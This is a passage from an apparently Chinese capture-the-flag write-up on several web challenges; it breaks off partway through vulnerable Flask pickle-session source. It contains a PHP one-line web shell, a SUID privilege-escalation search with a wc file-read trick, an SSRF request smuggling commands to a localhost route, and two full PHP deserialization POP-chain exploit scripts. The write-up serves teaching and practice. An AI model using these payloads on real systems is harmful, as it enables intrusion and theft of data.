class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>蚁剑连接，尝试打开flag，但是发现没有权限</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251703014.png" alt="image-20250325170326857"></p><p>进行suid提权试试：所谓suid就是，你本来是www-data的权限，但是当你执⾏有suid权限的⽂件时，你会暂时拥有这⽂件所有者的权限（比如root）。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><ul><li><code>find /</code><br> 从根目录 <code>/</code> 开始递归查找所有文件和目录。</li><li><code>-user root</code><br> 查找<strong>属主为 root</strong> 的文件。</li><li><code>-perm -4000</code><br> 查找<strong>SUID（Set User ID）位被设置的文件</strong>。<ul><li><code>4000</code> 代表 SUID 权限（以八进制表示）。</li><li><code>-perm -4000</code> 表示只要文件有 SUID 权限就匹配。</li><li>SUID 通常用在二进制程序上，表示<strong>执行该文件的用户会临时获得文件所有者（root）的权限</strong>。</li></ul></li><li><code>-print</code><br> 输出匹配到的文件路径。</li><li><code>2&gt;/dev/null</code><br> 把标准错误输出（2）重定向到 <code>/dev/null</code>，即<strong>隐藏所有错误信息</strong>（比如“没有权限”的报错）。</li></ul><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251704809.png" alt="image-20250325170434619"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wc --files0-<span class="hljs-keyword">from</span> <span class="hljs-string">&quot;/flag&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>/var/www/html/wc</code><br> 指定了一个名为 <code>wc</code> 的程序（通常是 Unix&#x2F;Linux 的 “word count” 工具），但这里它位于 <code>/var/www/html/</code> 目录下。这意味着它<strong>不是系统自带的 <code>/usr/bin/wc</code></strong>，而是一个放在网页根目录下的自定义或上传的二进制文件或脚本。</li><li><code>--files0-from &quot;/flag&quot;</code><br> 是 <code>wc</code> 工具的一个参数，用于<strong>从指定文件读取要统计的文件名列表</strong>。</li><li>在本命令中，<code>/flag</code> 被当作参数传递给 <code>--files0-from</code>，意思是：<strong>把 <code>/flag</code> 文件的内容当作文件名列表来处理</strong>。</li></ul><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251706600.png" alt="image-20250325170653375"></p><p>这题还是读代码能力不行，是不是写得少了？</p><p>没耐心读，实际上很简单了</p><h1 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h1><p>代码审计，主要是下面两个路由</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/Gopher&#x27;</span>)<br>def <span class="hljs-built_in">visit</span>():<br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    if url is <span class="hljs-attribute">None</span>:<br>        return <span class="hljs-string">&quot;No url provided :)&quot;</span><br>    url = <span class="hljs-built_in">urlparse</span>(url)<br>    realIpAddress = socket.<span class="hljs-built_in">gethostbyname</span>(url.hostname)<br>    if url.scheme == <span class="hljs-string">&quot;file&quot;</span> or realIpAddress in <span class="hljs-attribute">BlackList</span>:<br>        return <span class="hljs-string">&quot;No (≧∇≦)&quot;</span><br>    result = subprocess.<span class="hljs-built_in">run</span>([<span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-built_in">urlunparse</span>(url)], capture_output=True, text=True)<br>    return result.stdout<br>    <br><br><br><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/Manage&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">cmd</span>():<br>    if request.remote_addr != <span class="hljs-string">&quot;127.0.0.1&quot;</span>:<br>        return <span class="hljs-string">&quot;Forbidden!!!&quot;</span><br>    if request.method == <span class="hljs-string">&quot;GET&quot;</span>:<br>        return <span class="hljs-string">&quot;Allowed!!!&quot;</span><br>    if request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        return os.<span class="hljs-built_in">popen</span>(request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;cmd&quot;</span>)).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>我们在&#x2F;Gopher路由处发一个gopher协议给127.0.0.2:8000，然后让其发送如下POST请求</p><p><strong>127.0.0.1 与 127.0.0.2 被包含于 A 类地址中. 但是他们同时又是特殊地址. 你无论访问什么服务, 如果目的地址处于 127.0.0.1 到127.255.255.255 这个区间内, 实际上都是在访问你自己.</strong> 你可以自行选择是将你监听的服务绑定在哪个地址上. 一般来说都会默认绑定在 127.0.0.1. 这是大众习惯。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">POST</span> /<span class="hljs-title class_">Manage</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-symbol">host:</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:application/x-www-form-urlencoded</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Length</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><br><br>cmd=env<br></code></pre></td></tr></table></figure><p>实际上就是先发给127.0.0.2:8000，然后让他访问本机（127.0.0.1）的&#x2F;Manage路由，从而绕过<code>if request.remote_addr != &quot;127.0.0.1&quot;</code>，进而命令执行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503261118693.png" alt="image-20250326111818523"></p><h1 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h1><p>审计代码，一共有两种POP链</p><p>一种是</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">CherryBlossom&#123;<span class="hljs-built_in">__destruct</span>()&#125; --&gt;  Samurai&#123;<span class="hljs-built_in">__toString</span>()&#125; --&gt; Warlord&#123;<span class="hljs-built_in">__call</span>()&#125; --&gt; Philosopher&#123;<span class="hljs-built_in">__invoke</span>()&#125; --&gt; Mystery&#123;<span class="hljs-built_in">__get</span>()&#125;<br></code></pre></td></tr></table></figure><p>注意<code>Philosopher&#123;__invoke()&#125;</code>触发<code>Mystery&#123;__get()&#125;</code>需要双重md5绕过，用脚本跑即可</p><p>而<code>Mystery&#123;__get()&#125;</code>我们利用的是原生类</p><p>POP链构造如下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CherryBlossom</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fruit1;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Samurai</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit6</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit7</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$long</span> = @<span class="hljs-variable language_">$this</span>-&gt;fruit6-&gt;<span class="hljs-title function_ invoke__">add</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$long</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Warlord</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit4</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;fruit4;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Philosopher</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit10</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit11</span> = <span class="hljs-string">&quot;rT7EHUpmlJPjT0fyQgOh&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;fruit11)) == <span class="hljs-number">666</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;fruit10-&gt;hey;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mystery</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-comment">//public $GlobIterator=&quot;/*&quot;;//遍历文件目录类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$SplFileObject</span>=<span class="hljs-string">&quot;/flag44545615441084&quot;</span>;<span class="hljs-comment">//读取文件类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$day1</span>, <span class="hljs-variable">$day2</span>) &#123;<br>            <span class="hljs-variable">$day3</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$day2</span>(<span class="hljs-variable">$day1</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$day3</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$day4</span>) &#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$day4</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CherryBlossom</span>();<br><span class="hljs-variable">$a</span> -&gt;fruit1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Samurai</span>();<br><span class="hljs-variable">$a</span>-&gt;fruit1-&gt;fruit6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Warlord</span>();<br><span class="hljs-variable">$a</span>-&gt;fruit1-&gt;fruit6-&gt;fruit4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Philosopher</span>();<br><span class="hljs-variable">$a</span>-&gt;fruit1-&gt;fruit6-&gt;fruit4-&gt;fruit10 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mystery</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>结果为</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503271745124.png" alt="image-20250327174516925"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503271747572.png" alt="image-20250327174759452"></p><p>另一种是</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">CherryBlossom&#123;<span class="hljs-built_in">__destruct</span>()&#125; --&gt;  CherryBlossom&#123;<span class="hljs-built_in">__toString</span>()&#125; --&gt; Philosopher&#123;<span class="hljs-built_in">__invoke</span>()&#125; --&gt; Mystery&#123;<span class="hljs-built_in">__get</span>()&#125;<br></code></pre></td></tr></table></figure><p>POP链构造为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CherryBlossom</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fruit1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$newFunc</span> = <span class="hljs-variable language_">$this</span>-&gt;fruit2;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFunc</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mystery</span></span><br><span class="hljs-class"></span>&#123;<br><br><span class="hljs-comment">//    public $GlobIterator=&quot;/*&quot;;//遍历文件目录类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$SplFileObject</span>=<span class="hljs-string">&quot;/flag44545615441084&quot;</span>;<span class="hljs-comment">//读取文件类</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$day1</span>, <span class="hljs-variable">$day2</span>) &#123;<br>            <span class="hljs-variable">$day3</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$day2</span>(<span class="hljs-variable">$day1</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$day3</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$day4</span>) &#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$day4</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Philosopher</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit10</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fruit11</span> = <span class="hljs-string">&quot;rSYwGEnSLmJWWqkEARJp&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;fruit11)) == <span class="hljs-number">666</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;fruit10-&gt;hey;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CherryBlossom</span>();<br><span class="hljs-variable">$b</span>-&gt;fruit1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CherryBlossom</span>();<br><span class="hljs-variable">$b</span>-&gt;fruit1-&gt;fruit2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Philosopher</span>();<br><span class="hljs-variable">$b</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mystery</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><h1 id="ezzzz-pickle"><a href="#ezzzz-pickle" class="headerlink" title="ezzzz_pickle"></a>ezzzz_pickle</h1><p>密码爆破（没说不让爆破，那就是爆破？）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292207515.png" alt="image-20250327231034938"></p><p>登录成功</p><p>抓包，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292207005.png" alt="image-20250327231236598"></p><p>看前端代码，给了提示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292207487.png" alt="image-20250327233021277"></p><p>利用文件读取漏洞读源码（为什么是这个路径？似乎得学一下开发）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292207935.png" alt="image-20250327231532210"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, make_response,render_template<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="hljs-keyword">import</span> Cipher, algorithms, modes<br><span class="hljs-keyword">from</span> cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> padding<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key_iv</span>():<br>    key = os.environ.get(<span class="hljs-string">&#x27;SECRET_key&#x27;</span>).encode()<br>    iv = os.environ.get(<span class="hljs-string">&#x27;SECRET_iv&#x27;</span>).encode()<br>    <span class="hljs-keyword">return</span> key, iv<br><br><br><span class="hljs-comment"># AES 加密和解密函数（一个函数处理加密和解密）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt_decrypt</span>(<span class="hljs-params">data, key, iv, mode=<span class="hljs-string">&#x27;encrypt&#x27;</span></span>):<br>    <span class="hljs-comment"># 创建加密器/解密器</span><br>    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())<br><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&#x27;encrypt&#x27;</span>:<br>        encryptor = cipher.encryptor()<br>        <span class="hljs-comment"># 数据填充，确保数据的长度是 AES 块大小的倍数</span><br>        padder = padding.PKCS7(algorithms.AES.block_size).padder()<br>        padded_data = padder.update(data.encode()) + padder.finalize()<br>        result = encryptor.update(padded_data) + encryptor.finalize()<br>        <span class="hljs-keyword">return</span> base64.b64encode(result).decode()  <span class="hljs-comment"># 返回加密后的数据（Base64编码）</span><br><br>    <span class="hljs-keyword">elif</span> mode == <span class="hljs-string">&#x27;decrypt&#x27;</span>:<br>        decryptor = cipher.decryptor()<br>        <span class="hljs-comment"># 解密数据</span><br>        encrypted_data_bytes = base64.b64decode(data)<br>        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()<br>        <span class="hljs-comment"># 去除填充</span><br>        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()<br>        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()<br>        <span class="hljs-keyword">return</span> unpadded_data.decode()<br><br>users = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin123&quot;</span>,<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_session</span>(<span class="hljs-params">username</span>):<br><br>    session_data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: username,<br>        <span class="hljs-string">&quot;expires&quot;</span>: time.time() + <span class="hljs-number">3600</span>  <span class="hljs-comment"># 1小时过期</span><br>    &#125;<br>    pickled = pickle.dumps(session_data)<br>    pickled_data = base64.b64encode(pickled).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    key,iv=generate_key_iv()<br>    session=aes_encrypt_decrypt(pickled_data, key, iv,mode=<span class="hljs-string">&#x27;encrypt&#x27;</span>)<br><br><br>    <span class="hljs-keyword">return</span> session<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dowload_file</span>(<span class="hljs-params">filename</span>):<br>    path=os.path.join(<span class="hljs-string">&quot;static&quot;</span>,filename)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data=f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_session</span>(<span class="hljs-params">cookie</span>):<br><br>    <span class="hljs-keyword">try</span>:<br>        key, iv = generate_key_iv()<br>        pickled = aes_encrypt_decrypt(cookie, key, iv,mode=<span class="hljs-string">&#x27;decrypt&#x27;</span>)<br>        pickled_data=base64.b64decode(pickled)<br><br>        <span class="hljs-comment"># 反序列化数据</span><br>        session_data = pickle.loads(pickled_data)<br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&quot;username&quot;</span>] !=<span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># 检查过期时间</span><br>        <span class="hljs-keyword">return</span> session_data <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&quot;expires&quot;</span>] &gt; time.time() <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session&quot;</span> <span class="hljs-keyword">in</span> request.cookies:<br>        session = validate_session(request.cookies[<span 